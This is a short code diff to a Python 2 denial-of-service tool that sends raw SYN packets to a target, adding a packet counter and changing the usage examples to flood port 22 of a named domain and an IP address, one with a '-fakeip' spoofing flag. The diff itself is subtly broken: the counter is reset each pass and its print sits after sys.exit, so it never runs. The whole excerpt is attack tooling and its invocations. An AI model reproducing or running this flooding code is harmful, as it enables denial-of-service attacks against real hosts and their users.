@@ -318,9 +318,11 @@ class syn(Thread):
                 pkt_sent = 0
 		try:
 			self.lock.acquire()
+                        pkt_sent += 1
 			self.sock.sendto(packet,(self.tgt,0))
 		except KeyboardInterrupt:
 			sys.exit(cprint('[+] Attack Attack canceled by user','red'))
+                        cprint(pkt_sent, 'yellow')
 		except Exception,e:
 			cprint(e,'red')
 		finally:
@@ -334,9 +336,9 @@ def main():
         description=cprint(title,'white',attrs=['bold']),
         epilog='''
 Example:
-    ./%(prog)s -target www.target.com -port 80 -T 2000 -slow
-    ./%(prog)s -target www.target.com -sleep 100 -request
-    ./%(prog)s -target www.target.com -syn -T 5000 -t 10.0
+    ./%(prog)s -target www.vikas-69.com -p 22 -threads 100 -syn
+    ./%(prog)s -target 69.96.69.96 -p 22 -threads 1 -syn
+    ./%(prog)s -target 69.96.69.96 -p 22 -threads 1 -fakeip -syn 
 '''
 )
 	options = parser.add_argument_group('options','')
